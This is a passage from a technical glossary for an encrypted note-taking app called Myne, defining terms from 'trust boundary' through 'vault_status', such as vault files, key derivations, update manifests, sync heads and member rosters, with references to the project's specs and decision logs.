[markdown-dialect.md](spec/markdown-dialect.md) §3.6.1 (`trashed:` field), [decisions.md](decisions.md) 2026-06-03 (the implementing entry) + 2026-05-07 (the deferral).

Used in: `spec/markdown-dialect.md` §3.6.1, `decisions.md` 2026-06-03 + 2026-05-07 (MYND-133)

### **trust boundary** &nbsp; ⚠️ *Threat*

A line in the system where the security model changes — what is trusted on one side is not trusted on the other. The catalog grows as the product does — TB10 arrived with the browser clipper's native-messaging bridge, TB11 with the served web bundle — so `threat-model.md` §3 is the table of record; read the boundaries there rather than restating their extent (or their count) here.

Used in: `threat-model.md` §3

### **trust headline** &nbsp; 📦 *Product*

The line on the AI settings panel that answers **where this configuration can send your text**, as opposed to who answered the last request (that is the [effective backend](#effective-backend), and the two are deliberately different questions).

It stays on the CONFIGURED value rather than on the host's report of what actually answered, and the asymmetry is a safety direction rather than an oversight. Over-claiming egress makes a reader more careful than they need to be. Under-claiming tells someone their text stays on the device while it leaves, and deriving this line from the report would under-claim twice: in the window before the first report lands, and for a user who has named a provider and is one keystroke (picking a model) away from egress, on the very panel where they will make it.

Used in: `decisions.md` 2026-08-15; myne-md/myne#466

### **typewriter scroll** &nbsp; 📦 *Product*

A [focus-mode](#focus-mode) writing aid (MYND-348): the line being edited is kept vertically centered in the viewport as the writer types, so the eyes stay in one place instead of drifting to the bottom of the screen. A hand-rolled CodeMirror extension (active-line scroll-margin / `scrollIntoView` centering — **no new dependency**) gated by the editor root's `data-focus-typewriter` attribute (set only when focus mode is active **and** the `editor_focus_typewriter` MYP1 pref is on — default on; the Settings → Editor toggle flips it). Honors `prefers-reduced-motion`. Toggleable because some writers find the constant re-centering disorienting. Non-load-bearing cosmetic (AS-low). See also [focus mode](#focus-mode), [line-focus dimming](#line-focus-dimming).

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-17 (MYND-348)

### **unused attachment** &nbsp; 📋 *Protocol*

An [attachment](#attachment) referenced by **zero live notes** — either orphaned (its referencing note(s) deleted) or never inserted (imported into the library but not yet embedded). It stays in the [`vault.attachments`](#vaultattachments) catalog and visible in the library (Myne is library-first; `protocol.md` §9.10 keeps metadata after note deletion); it is **never** auto-deleted. The only thing that removes it is the explicit user-triggered "Clean unused attachments" sweep, which recomputes the zero-reference set authoritatively (scanning every note, fail-closed) and cryptographically erases the confirmed set. Distinct from a [stray attachment file](#stray-attachment-file) (catalog-less crash remnant). (MYND-171; `decisions.md` 2026-06-13)

### **unsynced mark** &nbsp; 📦 *Product*

The [inline status mark](#inline-status-mark) that says a note's current bytes have not reached the server: `cloud-off`, a cloud with a corner-to-corner slash, at the trailing edge of a sidebar note row and after the [save readout](#save-readout) in the bottom bar (myne-md/myne#603).

It **depicts the sentence**, and after three attempts that is the whole of the lesson. It was a hollow 6px ring, which at that size is the same glyph as a dot. It became the save readout's own three-quarter arc, which put two identical grey marks a pixel apart on the `Editing…` readout meaning two different things. It became a solid 8px triangle, which was at least distinct and depicted nothing, so down a column of sidebar rows it read as a bullet point. Each of the three was hand-drawn geometry small enough to be unlearnable; the fix was a named icon at a size where an icon works.

It **never moves and is never `--accent`**, unlike the readout's own marks. There is no bounded in-flight variant of it to express: a note can sit unsynced for a week on a machine that is shut, so motion and the accent colour both stay with the save readout, where the work ends.

Used in: `docs/design/README.md` (Iconography), `src/components/Spinner.tsx`, `src/notes/components/NoteRow.tsx`, `src/notes/components/SaveStatus.tsx`

### **update channel** &nbsp; 📦 *Product*

Which release line a desktop client's [self-update](#self-update) follows: `stable` (default) or `beta`. Baked at build time (`MYNE_UPDATE_CHANNEL`), not chosen in-app, so there is no runtime switcher and no downgrade path. The **update manifest** is the static signed document the channel points at: a version, notes, and per-platform artifact URLs and signatures, in the shape `tauri-plugin-updater` expects. Both manifests live on `downloads.myne.md` (`latest.json`, `latest-beta.json`) and both are signed with the same offline release key; both are published by hand (`decisions/clients/0651`).

Used in: `threat-model.md` TB7, `decisions/clients/0651`

### **update manifest** &nbsp; 📦 *Product*

The static document a desktop client's [update channel](#update-channel) points at: a version, optional notes and publication date, and per-platform artifact URLs with their signatures, in the shape `tauri-plugin-updater` reads. The signatures cover each downloaded artifact, not the manifest, so a substituted manifest cannot forge an install (the artifact signature and the version gate hold); what it can do is withhold an offer or alter the notes the client reads over TLS. Both manifests (`latest.json`, `latest-beta.json`) live on `downloads.myne.md`.

Used in: `threat-model.md` TB7; `scripts/emit-update-manifest.mjs`

### **UUIDv4** &nbsp; 📋 *Protocol*

Random-only UUID variant. Not used in Myne v0.1; reserved as a candidate for a later version if the millisecond-resolution timing leakage of UUIDv7 (used for note filenames) becomes unacceptable.

Used in: `threat-model.md` §7 (deferred consideration)

### **UUIDv7** &nbsp; 📋 *Protocol*

Time-ordered UUID variant (RFC 9562). Used as the filename of `.myn` files in v0.1, providing natural sort order at the cost of leaking a millisecond-resolution creation-time bucket. The leak is documented in §9.4 and accepted in v0.1.

Used in: `spec/protocol.md` §9.1

### **v0.1** &nbsp; 📦 *Product*

The first Myne protocol specification (`spec/protocol.md`). Covers Phase 1 at-rest encryption only. Sync, multi-device, sharing, and post-quantum primitives are out of scope; they appear in a later major version.

Used in: `spec/protocol.md` (titled v0.1)

### **Vault import** &nbsp; 📦 *Product*

*(Aliases: Myne vault import. Myne-divergent: yes.)*

Bringing notes from a Myne vault into another, from either a local vault on this device or an externally exported `.myne-backup` file, as the entries in the import-source picker (myne-md/myne#816 added the backup source). It ADDS notes to the open vault, which is what distinguishes it from **restore backup**: a restore PLACES a whole vault and never decrypts a note, where an import decrypts each note under the **source vault**'s keys and re-seals it under the **target vault**'s. For a backup source, the credential is the backup's OWN password or recovery phrase, not the target vault's. Notes, folders, tags, the links between imported notes, the attachments those notes reference, and the source's added dictionary words cross. Version history, trashed notes, templates, unreferenced attachments, prefs, themes, workspace layout, the search index, the device roster and sync enrolment do not.

Used in: `threat-model.md` A6, `spec/markdown-dialect.md` §6

### **Import label** &nbsp; 📦 *Product*

*(Aliases: none. Myne-divergent: yes.)*

The name a user gives one **vault import**, prefilled from the **source vault**'s own name. It does two jobs. It is the suffix a colliding note is renamed with (`Project` becomes `Project (Eski laptop)`), which is what lets an imported wikilink be pointed at the note that came with it rather than at the target's own note of that name. And because it is stable rather than a counter, re-running the same import under the same label re-derives the same renamed title, finds it already present, and skips: the label is what makes a repeat import idempotent, and changing it is what makes it not.

Used in: `spec/markdown-dialect.md` §6

### **VaultId** &nbsp; 🗝️ *Key/identifier*

A random **UUIDv7** that names a vault: it is both the `vaults/<id>/` on-disk directory name and the runtime `HashMap<VaultId, Slot>` key. Opaque and **decoupled from `account_number_hash`** — the directory name leaks no account-correlation tag to a disk observer (a deliberate rejection of an `account_hash_short`-derived name). Minted via `VaultId::mint()` (a directory collision triggers mint-and-retry); rendered/parsed as its 36-char hyphenated form. Not a secret and not a key — it encrypts nothing. Introduced for multi-vault.

Used in: `decisions.md` 2026-06-09 "Vault disk layout: vaults/<id>/ + eager boot migration"

### **vault** &nbsp; 📦 *Product*

A user's encrypted note collection — the unit of Myne's data model. Concretely: a directory containing `vault.meta`, a `notes/` subdirectory of `.myn` files, and (reserved for v0.1) an `attachments/` subdirectory.

Used in: `spec/protocol.md` §9.1

### **vault backup file** &nbsp; 📦 *Product*

*(Alias: `.myne-backup`.)*

A single-file, user-initiated copy of one vault, written to a user-chosen destination with extension `.myne-backup` (magic `MYB1`; format in `spec/protocol.md` §9.11). Members are byte-for-byte ciphertext copies of the vault's files per a closed allowlist ("user data in, caches out": `vault.meta`, `vault.prefs`, notes, snapshots, attachments + catalog; `vault.search` excluded). A plaintext member table carries paths, lengths, and per-member SHA-256 — **unkeyed corruption detection, no tamper-resistance claim**; producers verify by re-reading the destination before reporting success, consumers verify before placement. No new cryptography: no outer envelope, no derived keys (see [backup-key](#backup-key)). Not a sync artifact and not the portability path (that remains decrypted markdown). User-facing term is "backup" — never "archive" or "snapshot". Leak posture and backups-outlive-erase consequences: `threat-model.md` §7.

Used in: `spec/protocol.md` §9.11; `threat-model.md` §7; `decisions.md` 2026-06-10

### **vault creation session** &nbsp; 📦 *Product*

The backend-resident state held between the `begin` and `commit` IPC calls of the vault-creation flow. A `VaultCreationSession` (Rust struct in `core/src/plugins/vault_creation/state.rs`) carries the freshly generated `account_number`, `recovery_phrase`, `root_key`, two Argon2id salts, the cached password and recovery wrap keys, the chosen `KdfParams`, and a `created_at: Instant` timestamp. Lives in a `Mutex<HashMap<Uuid, VaultCreationSession>>` indexed by **session token**. Bounded by `MAX_CONCURRENT_SESSIONS = 4` and `SESSION_TTL_SECS = 600` (10 minutes); evicted by a background `tokio::time::interval(60s)` task whose evicted tokens land in a parallel **tombstone** map for up to `TOMBSTONE_RETENTION_SECS = 3600` (1 hour). `root_key` and the wrap keys never cross the IPC boundary — they live only in this session until `commit` consumes it.

Used in: `decisions.md` 2026-04-28 "Vault creation flow", "Vault creation session TTL"


### **vault head** &nbsp; 📋 *Protocol* (deep entry)

The malicious-server hardening primitive for Phase 2 sync: a small, server-relayed, per-push record that commits the vault's current state under an HMAC-SHA-256 keyed by `DeriveSubkey(root_key, "vault-head-mac")` (§3.4). It commits a flat `SHA-256` of the canonical [vault-head manifest](#vault-head-manifest) (`uuid → content_nonce` of content blobs only — notes + attachments), a per-device [version vector](#version-vector-vv), and `prev_head_hash[]` parent links ([head_id](#head_id)s) forming a git-like hash-DAG, plus an auxiliary Lamport `seq`. Provides [fork-consistency](#fork-consistency): devices verify on pull that a new head **extends** their last-seen one (VV-dominance), and divergence surfaces on cross-read. The head is **wire-only** (no on-disk magic; the device-local last-seen baseline is the `MYH1` `vault.head-state` blob, `spec/protocol.md` §9.16). The server, lacking `root_key`, can only replay/withhold/reorder real heads, never forge one. **HMAC-not-signature**: single-user → all devices share `root_key` → a symmetric MAC suffices (no Ed25519, closed primitive set). **Signature-authenticated from `head_format_version = 0x02`** (`decisions/protocol/0603`, myne-md/myne#711): because a B2B member holds no `root_key`, a head is then signed by the author's [person keypair](#person-keypair) (Ed25519 + ML-DSA-65) and carries a vault-scoped pseudonymous [head author id](#head-author-id); verification is peer-side and covers the head only, so attribution is at push granularity. Every vault adopts `0x02`, including one that never invites, and the change is a re-base that reuses the whole-vault migration machinery; no on-disk magic, AAD prefix or content blob moves. Phase 2; full spec in `spec/sync-protocol.md`.

Used in: `spec/sync-protocol.md`; `spec/protocol.md` §3.4, §9.16, §10.3; `threat-model.md` §7 (MYND-416)

### **vault-head manifest** &nbsp; 📋 *Protocol*

The `uuid → content_nonce` map of a vault's **content blobs only** (notes + attachments; synced singletons like [vault.prefs](#vaultprefs) / [vault.meta](#vaultmeta) are excluded — their rollback is the already-accepted "local prefs replay" of `threat-model.md` §7). A [vault head](#vault-head) commits a flat `SHA-256` of this map's canonical encoding (uuid-sorted, fixed-width), not the map itself, keeping the head O(1). Binding [content_nonce](#content_type) (fresh-random per save, §6.3) rather than a bare counter gives **two-layer** rollback detection: a server serving an old version mismatches the manifest *before* decryption, and the AEAD nonce-binding makes a header/content splice fail *on* decrypt. The manifest object's own canonical encoding is the sync wire protocol's concern (MYND-414); the head only anchors its hash. Phase 2.

Used in: `spec/sync-protocol.md` (vault head)

### **vault invite** &nbsp; 📦 *Product*

The B2B member invitation (`myne-md/myne#698`, `design-notes/protocol/0592`):
one message an owner sends a prospective member. It carries the vault
`itemsKey` wrapped to that member ([per-recipient wrap](#per-recipient-wrap))
plus the owner's identity public halves and a double signature (Ed25519 +
ML-DSA-65, side by side), and the canonical payload is itself AEAD-sealed to
the member under a fresh hybrid frame. Nothing the recipient acts on is
signed-plaintext: the payload frame is encrypted, and every carried byte is
signature-bound with the `"myne.vault-invite v1|"` message-class prefix. The
recipient verifies both signature halves, checks the carried owner material
against the claimed fingerprint, and unwraps the `itemsKey` as proof of
receipt. The invite-time SAS is the owner and member comparing fingerprints
out of band (the [bootstrap-fingerprint](#bootstrap-fingerprint) pattern); a
key change after the invite would be surfaced by
[previousKeySet](#previouskeyset) once that identity-re-roll feature lands, and
continuous Key Transparency stays on the roadmap. The transport is the [invite relay](#invite-relay)
since `decisions/protocol/0603`: the invite is sealed and stored until claimed, and the outer routing
frame carries only the recipient account id and the vault id, so the server reads no fingerprint,
public half or group key.

Used in: `design-notes/protocol/0592`; `myne-md/myne#698`.

### **vault label** &nbsp; 📦 *Product*

A per-vault human-readable name shown in the [vault picker](#vault-picker) and [vault switcher](#vault-switcher). Stored **encrypted-only** inside that vault's [vault.prefs](#vaultprefs) (a non-breaking field on the §9.5 extensible prefs JSON — no new magic, the `MYP1` envelope is unchanged), decrypted into a RAM cache on unlock. Set via the `vault_set_label` IPC, **unlock-gated by construction** (only the active/sole-`Unlocked` vault is writable — a locked vault cannot be renamed). Never written in plaintext at rest and never crosses IPC except as the user's own input; a vault not unlocked this session shows a neutral "Vault N" fallback instead (SYNC-3). Introduced for multi-vault.

Used in: `decisions.md` 2026-06-09 "Multi-vault in-app switcher + label management"

### **vault membership** &nbsp; 📦 *Product*

The per-vault half of the account/vault split: a sealed field inside a vault's `vault.meta` carrying
the 16-byte account id of the account the vault belongs to. Sealed under a `root_key`-derived KEK
(`membership-key`) with `account_number_hash` bound into the AAD, so it is invisible to the server
and to a filesystem adversary, and a field copied from another vault fails AEAD. Absent means
unmigrated (the vault groups via the device-local **account record** alone), never a parse error.
Written eagerly at vault creation and lazily on each natural unlock, never gating the unlock. The
device-local half is the **account record**. Distinct from the server-side person-to-vault
[membership binding](#person-account) (`decisions/protocol/0603`), which is the authenticated record
that issues a per-vault bearer token; this field is the encrypted client-side record of which account
a vault belongs to.

Used in: `spec/protocol.md` §9.3.1

### **vault role** &nbsp; 📦 *Product*

A member's standing in a B2B-shared vault: the singleton `owner` (the
`root_key` holder, the only writer of the roster) or a plain `member`.
Administrative metadata inside the owner-sealed roster: it gates no decryption
and no read, and content write is flat, so every member is an authorized
writer. Absent on rows written before the field existed, which read as
`member` by construction.

Used in: `design-notes/protocol/0593`; `core/src/plugins/sync/roster.rs`.

### **vault roster** &nbsp; 📦 *Product*

The member list of a B2B-shared vault: one row per person, keyed by their
[person fingerprint](#person-keypair), carrying the display name, the member's
public halves (so any device can re-wrap a rotated `itemsKey` to them without a
round-trip), their per-recipient `itemsKey` wrap, the vault [role](#vault-role),
a causal `version`, a
tombstone flag, an optional [previousKeySet](#previouskeyset) and the join time.
Encoded as canonical JSON and sealed inside the
[membership roster extension](#membership-roster-extension). Union-merged across
devices with a remove-wins tie (a tombstone outranks a stale live row), so a
removal cannot be resurrected.

Used in: `design-notes/protocol/0592`; `design-notes/protocol/0593`; `core/src/plugins/sync/roster.rs`.

### **vault picker** &nbsp; 📦 *Product*

The startup vault-selection surface, shown **only when ≥2 vaults exist** (0 vaults → Welcome; exactly 1 → unlock directly): a payload-free `{ name: "picker" }` [Stage](#slot) variant produced only by the boot probe `initialStageFromProbe(vaultList, slotMap)`, never via `transition`. Lists each discovered vault (disk-scan + [vault registry](#vault-registry)) by a neutral fallback label ("Vault N", ordered most-recently-opened first); real labels stay encrypted in each vault's [vault.prefs](#vaultprefs) and show only for a this-session-unlocked vault. Selecting a row opens that vault (its [VaultId](#vaultid) flows to the unlock IPC; lock-then-unlock evicts any prior open vault). A distinct "Create another vault" affordance routes to vault creation. Vaults that belong to an [account](#account) are grouped under that account's label, which is user-renamable and likewise readable pre-unlock from the sealed device-local account record. Pre-unlock it surfaces only the vault **count + last-unlock timing** plus account **labels and grouping** (accepted leaks, `threat-model.md` §7). It never shows note content, passwords, or recovery material. Vault names and account labels both follow the [hide vault names](#hide-vault-names) option: with it on, the picker lists every vault individually with no headers and the account actions are refused. The recovery picker reuses the same view-model.

Used in: `decisions.md` 2026-06-09 "Multi-vault onboarding + vault picker"

### **vault registry** &nbsp; 📦 *Product*

A best-effort, **rebuildable** on-disk cache (`<app_data_dir>/vaults/registry.json`) holding only each vault's opaque [VaultId](#vaultid) + last-unlock timestamp — **no human label** at rest (labels live encrypted in [vault.prefs](#vaultprefs)). It is **not authoritative**: the discovery authority is the disk-scan of `vaults/<id>/` directories, so a missing or corrupt registry is transparently rebuilt from disk and discovery never fails when the cache is gone. Serves the pre-unlock picker's stable ordering. Introduced for multi-vault.

Used in: `decisions.md` 2026-06-09 "Vault disk layout: vaults/<id>/ + eager boot migration"

### **vault root** &nbsp; 📦 *Product* *(retired 2026-06-02)*

*Retired as a named sidebar section by MYND-183 (`decisions.md` 2026-06-02): folderless notes are no longer bucketed under a separate "Vault root" header but render at the root level of the unified [item-order](#item-order) tree, alongside top-level folders. The **logical root position** it described — a note whose `folder:` frontmatter is **absent** — remains first-class and unchanged (`spec/markdown-dialect.md` §3.6 still uses "root / unfiled" for that state); only the dedicated sidebar section is gone. Unrelated: "vault root" in `spec/wikilink.md` means the on-disk vault directory (the folder holding `vault.meta`), a different sense untouched here. Preserved for audit trail.*

The top of the virtual folder tree — the home of *unfiled* notes. A note is at the vault root when its `folder:` frontmatter field is **absent** (`folder: ""` is read as root and normalized to absent; `folder: "/"` is rejected). Distinct from the *vault directory* on the filesystem: the vault root is a logical position in the sidebar tree, not a path on disk (the on-disk layout is always flat `notes/<uuid>.myn`). A new note created with no folder selected, and a note moved out of every folder, both land at the vault root. See also [folder](#folder).

Used in: `spec/markdown-dialect.md` §3.6.1–3.6.2; `decisions.md` 2026-05-29

### **vault switcher** &nbsp; 📦 *Product*

The in-app surface for changing the active vault while running — the sidebar-header account chip opens a dropdown listing the discovered vaults (the [vault picker](#vault-picker) view-model: real [label](#vault-label) for a this-session-unlocked vault, neutral "Vault N" fallback otherwise, last-unlock ordering, active vault marked). Selecting a non-active vault **switches** to it via **lock-then-unlock** (NOT a pointer-flip): the param-less `vault_lock()` runs the four-surface teardown (keys + search index + VaultIndices + attachment-refs) + `flushIfDirty`, then the target is unlocked (vault-addressed) — so the prior vault's plaintext is fully torn down before the next opens (SYNC-1/8). A brief "saving…" state covers the chain; selecting the active vault is a no-op. Introduced for multi-vault.

Used in: `decisions.md` 2026-06-09 "Multi-vault in-app switcher + label management"

### **vault.meta** &nbsp; 📦 *Product* (deep entry)

The single binary file holding vault-level cryptographic state. Magic bytes `MYV1` for v0.1. Layout per `spec/protocol.md` §9.3: protocol version, account_number_hash, the 11-byte canonical KDF parameters block, both salt-randomness fields (`random_salt_password_16`, `random_salt_recovery_16`), nonces and ciphertexts for both wrapped root-key copies (`enc_root_key_password`, `enc_root_key_recovery`), and the items_key_id, items_key_nonce, and `enc_items_key`. `vault.meta` plus the `.myn` files are the only artifacts that leave the device in any future sync scenario; both are opaque ciphertext plus a small public header.

Used in: `spec/protocol.md` §9.3

### **vault.prefs** &nbsp; 📦 *Product*

Vault-level singleton encrypted blob holding user-configurable preferences (Phase 1: the screen-capture-protection toggle from MYND-55/MYND-160). Magic bytes `MYP1` for v0.1. Lives at `<app_data_dir>/vault/vault.prefs` next to `vault.meta`. Outer envelope is a 34-byte fixed-offset header followed by AEAD-wrapped canonical JSON plaintext under `prefs_key`; layout + AAD construction + canonical encoding rules + size cap + migration-less semantic in `spec/protocol.md` §9.5. Written eagerly at `vault_create` (closed invariant: post-MYND-160 vaults always have `vault.prefs` on disk) and lazily re-read by every `prefs_read` IPC call (disk is canonical; not cached in `Slot::Unlocked`). Read failure (absent / truncated / AEAD-fail / parse-fail) returns `PrefsView::default()` per the §9.5.5 non-distinguishing semantic.

Used in: `spec/protocol.md` §9.5; `decisions.md` 2026-05-27 "Vault preferences blob"

### **vault.attachments** &nbsp; 📦 *Product*

The vault-level singleton catalog ([`MYC1`](#myc1) blob, `spec/protocol.md` §9.10) holding **authoritative** per-[attachment](#attachment) metadata — `id → {content_type, created_at, filename, size}` — so the attachments library can display an attachment even when no note references it (the filename survives note deletion; the in-note alias is a cosmetic copy). AEAD-encrypted under a `root_key`-derived KEK (`"myne.v0.1 attachments-catalog-key"`); canonical-JSON inner; fall-back-to-empty on absent/tampered; eager-written at vault creation. The note→attachment reference graph ("used in N notes") is **not** stored here — it is derived from note bodies at runtime via the `content_nonce` reconcile (the [search index](#search-index) MYND-29 pattern), kept in RAM and rebuilt on demand. (MYND-164)

### **vault.embeddings** &nbsp; 📦 *Product*

Vault-level singleton encrypted blob ([`MYR1`](#myr1), `spec/protocol.md` §9.17) caching the on-device **AI embedding index** — the dense semantic-search / Q&A vectors (MYND-453, local-ai epic). The structural twin of [vault.search](#vaultsearch): same 34-byte fixed-offset header (magic `MYR1`, protocol_version, an `embeddings_format_version` byte, nonce, ciphertext_len), same **engine-opaque** postcard inner plaintext (a `{note_id → content_nonce}` staleness manifest + the serialized vector store), same decryption-free `content_nonce` reconcile + [fall-to-rebuild](#fall-to-rebuild) posture — but stores embedding vectors, not full-text terms, and additionally carries a trailing **model-identity tuple** `{model_hash, embedding_dim, chunker_version}` that forces a full re-embed when the embedding model, its output dimension, or the chunker changes (vectors are model-specific; the embeddings analogue of `vault.search`'s `extractor_version`, carried inside the payload — **not** the AAD, which stays vault-scoped). AEAD-encrypted under `ai_embeddings_key` (`DeriveSubkey(root_key, "ai-embeddings-key")`); a pure **rebuildable cache** (deleting it loses nothing — the `.myn` files are the source of truth) — [rebuildable-cache](#sync-artefact-classes) Class 3, so **never synced and never backed up** (device-local; `sync-protocol.md` §319). Written only when the runtime beta opt-in `ai_enabled` is on (AI ships in the default build as of `decisions.md` 2026-07-02; a `--no-default-features` build never compiles the AI path and never writes it). At-rest size leaks a coarse embedded-volume signal, accepted as a derived-cache leak (`threat-model.md` §7, with the embedding-inversion note).

### **vault.graph** &nbsp; 📦 *Product*

Vault-level singleton encrypted blob ([`MYG1`](#myg1), `spec/protocol.md` §9.19) caching the knowledge-[graph view](#graph-view)'s laid-out **node positions** (`note_id → x/y`) + a schema-version marker, so reopening the app restores the previous force-directed layout instead of recomputing it. A structural sibling of [vault.workspace](#vaultworkspace): same 34-byte fixed-offset header (magic `MYG1`, protocol_version, a `graph_layout_format_version` byte, nonce, ciphertext_len), same **engine-opaque** inner plaintext (the client serializes the position map; the codec sees only bytes), same [fall-to-rebuild](#fall-to-rebuild) posture — but its staleness is caller-side and loose (a layout for a drifted note-set is still usable; missing notes get fresh seeds, and the graph's Refresh forces a full re-layout). AEAD-encrypted under [graph-layout-key](#graph-layout-key) (`DeriveSubkey(root_key, "graph-layout-key")`); a pure **rebuildable cache** (deleting it loses nothing — the `.myn` files are the source of truth) — [rebuildable-cache](#sync-artefact-classes) Class 3, so **never synced and never backed up**. Positions are dropped on vault lock (so vault A's layout never seeds vault B). At-rest size leaks a coarse note-count signal, accepted as a derived-cache leak (`threat-model.md` §7).

### **vault.indices** &nbsp; 📦 *Product*

Vault-level singleton encrypted blob ([`MYI1`](#myi1), `spec/protocol.md` §9.8) caching the [VaultIndices](#vaultindices) structured-metadata index — the wikilink graph + tag index + title resolution + the **typed [property](#property) records**, plus three per-note record kinds the entry used to omit: the imported **[block anchor](#block-anchor) records** behind the `[[^^` picker (MYND-382), the **[line-task projection](#line-task-projection)** (MYND-612), and the **[heading records](#heading-record)** behind the `[[##` picker (myne#216) (MYND-31 design; persistence landed by MYND-271, and `spec/protocol.md` §9.8.2 is the normative enumeration). The structural twin of [vault.search](#vaultsearch): same 34-byte fixed-offset header (magic `MYI1`, protocol_version, an `index_format_version` byte, nonce, ciphertext_len), same **engine-opaque** postcard inner plaintext (a `{note_id → content_nonce}` staleness manifest + the serialized structured index), same decryption-free `content_nonce` reconcile + [fall-to-rebuild](#fall-to-rebuild) posture — but indexes *structured* metadata, not full-text terms. AEAD-encrypted under [vault-indices-key](#vault-indices-key); a pure **rebuildable cache** (deleting it loses nothing — the `.myn` files are the source of truth), which is what keeps it inside the "not a database" commitment (`vision.md`). Distinct blob family from `vault.search` (one magic per family; `MYI1` ≠ `MYS1`). At-rest size leaks a coarse metadata-volume signal, accepted (`threat-model.md` A5).

Used in: `spec/protocol.md` §9.8; `decisions.md` 2026-06-14 (MYND-271)

### **vault-indices-key** &nbsp; 🗝️ *Key/identifier*

The 32-byte AEAD KEK encrypting [vault.indices](#vaultindices) (`MYI1`). Derived deterministically from `root_key` via the canonical `DeriveSubkey(root_key, "vault-indices-key")` helper (`spec/protocol.md` §3.4 registry entry `"myne.v0.1 vault-indices-key"`). Never persisted; re-derived on each unlock (to load / reconcile the index) and on each persist. Independent from the `itemsKey` lineage by design — like `prefs_key` / `search-index-key` / `session-state-key` it derives straight from `root_key`, so it survives the later epoch-rotation `itemsKey` evolution. The AAD `AAD_vault_indices_blob` (role `"vault-indices-blob"`, `spec/protocol.md` §9.8.3) binds the blob to its vault via `account_number_hash`. Distinct from `search-index-key` (one KEK role per blob family). (MYND-271)

Used in: `spec/protocol.md` §3.4, §9.8

### **vault.search** &nbsp; 📦 *Product*

Vault-level singleton encrypted blob caching the [search index](#search-index) (MYND-29). Magic bytes `MYS1` for v0.1. Lives at `<app_data_dir>/vault/vault.search` next to `vault.meta` and `vault.prefs`. Outer envelope is a 34-byte fixed-offset header (magic, protocol_version, an `index_format_version` byte where `vault.prefs` carries a reserved byte, nonce, ciphertext_len) followed by AEAD-wrapped plaintext under [search-index-key](#search-index-key); layout + AAD + staleness/reconcile + size cap in `spec/protocol.md` §9.6. The inner plaintext is **engine-opaque** (postcard-serialized `{note_id → content_nonce}` staleness manifest + the serialized inverted index) — distinct from `vault.prefs`'s canonical JSON, because the index is large and never field-validated. A pure **cache**: a warm unlock loads it and incrementally reconciles via the decryption-free `content_nonce` diff; on absence / AEAD-fail it [falls to rebuild](#fall-to-rebuild) (the `.myn` files are the source of truth). Flushed on graceful lock/quit + a periodic timer; idle auto-lock skips the flush (fail-closed). At-rest blob size leaks a coarse vocabulary/volume signal, accepted (`threat-model.md` A5).

Used in: `spec/protocol.md` §9.6; `decisions.md` 2026-05-31

### **vault.themes** &nbsp; 📦 *Product*

The encrypted singleton blob (`MYT1`, `spec/protocol.md` §9.21) holding every [custom theme](#custom-theme) palette in a vault, as a map `{ theme_name → { palette, clocks } }`. Sealed under `custom_themes_key = DeriveSubkey(root_key, "custom-themes-key")` — `root_key`-derived and itemsKey-independent, like [vault.prefs](#vaultprefs) / the [personal dictionary](#personal-dictionary) — with AAD role `"custom-themes-blob"` binding `account_number_hash`. A **singleton**, not a per-item family with a catalog: a vault holds a handful of themes. Each name carries its own `created_at`/`updated_at`/`deleted_at` clocks so the Phase-2 sync merges **per theme name** (two devices adding different themes both keep theirs), with the palette LWW within a name and deletions carried as tombstones under the [attachment catalog tombstone](#attachment-catalog-tombstone) resurrection guard (`sync-protocol.md` §10.2.2). Its reserved sync blob-id is `themes_sync_id = DeriveSubkey(root_key, "themes-sync-id")[0..16]` — an *identifier* derivation, not a KEK. A §9.11.3 backup-allowlist member (`sync ⊆ backup`). Introduced MYND-486.

### **vault_<verb_past> tracing event-name pattern** &nbsp; 🛠️ *Tooling*

Project-wide naming discipline for `tracing::info!(event = "...")` success-event emissions across the auth-pipeline plugins. Format: `vault_<verb in past tense>`. Concrete instances in v0.1: `vault_unlocked` (vault_unlock command success), `vault_locked` (vault_lock command success), `vault_recovered_with_phrase` (A8d phrase-recovery success), `vault_recovery_completed` (A8f post-recovery password commit success), and the forthcoming `vault_password_changed` (MYND-22's vault_change_password commit success). Future Phase 2 plugins (OPAQUE, hardware-unlock, etc.) extend the pattern without per-plugin `decisions.md` entries — the convention is self-evident from the existing instances. Phase 2 ops-tooling primitive: log aggregation queries can pattern-match `event = "vault_*"` once a `tracing-subscriber` is wired (deferred today). Pinned by `decisions.md` 2026-05-06 "Tracing event-name pattern: vault_<verb_past> across auth-pipeline plugins".

Used in: `core/src/plugins/{vault_unlock,vault_recover}/commands.rs`; `decisions.md` 2026-05-06.

### **vault_meta_bytes_hash** &nbsp; 🛠️ *Tooling*

Public-material `[u8; 32]` field on the desktop client's `Slot::Unlocked` carrying `SHA-256(vault.meta bytes)` captured at slot-populate time. Populated by `vault_unlock` (digest of unlock-time read bytes) and by `vault_complete_recovery` (digest of the freshly-rewritten bytes; AFTER `atomic_write` succeeds). Serves as the **in-memory CAS anchor** for `vault_change_password`'s in-place rewrite — the command compares the slot-held hash against a fresh digest of the on-disk bytes before committing the rewrite, returning `VaultMetaChangedExternally` and force-relocking on mismatch. SHA-256 of public bytes is itself public material; held bare without `Zeroize`. Pinned by `decisions.md` 2026-05-06 entry "Slot::Unlocked anchor field for vault.meta CAS" (MYND-22 foundation hardening).

Used in: `core/src/plugins/vault_unlock/state.rs::UnlockedVault.vault_meta_bytes_hash`; `decisions.md` 2026-05-06.

### **vault_status** &nbsp; 🛠️ *Tooling*

The single-vault **disk probe**: the command `vault_unlock:vault_status`, which reads `vault.meta` and classifies it as one of three states — `Exists` (the bytes parse cleanly via `protocol::parse_vault_meta`), `Missing` (the file is not there; the canonical first-run case, deliberately *not* an error), `Corrupted` (the file is there and `parse_vault_meta` rejected it). A genuine IO failure is **not** folded into `Corrupted`: permission-denied / no-space / other surface as `Err(VaultStatusError::IoError { io_error_kind })`, because IO failure is not corruption even where the fail-closed UI branches the same way. Read-only in the strongest sense — it holds no auth permit, runs no Argon2id, and never touches the runtime slot. Serde encoding is `#[serde(tag = "kind")]`, so the wire payload is an object (`{"kind":"Exists"}`) — mirrored by hand at `src/types/vault-status.ts` and wrapped by `probeVaultStatus` in `src/lib/vault-status.ts`. Permission `vault-unlock:allow-vault-status`, in the `vault-unlock:default` set. Boot routing itself has since moved up to `vault_list`, the multi-vault generalization that enumerates every discovered `vaults/<id>/` rather than probing the single legacy `vault.meta` (`decisions.md` 2026-06-09); `vault_status` remains the single-vault probe, still registered and still routed by the web dispatcher.

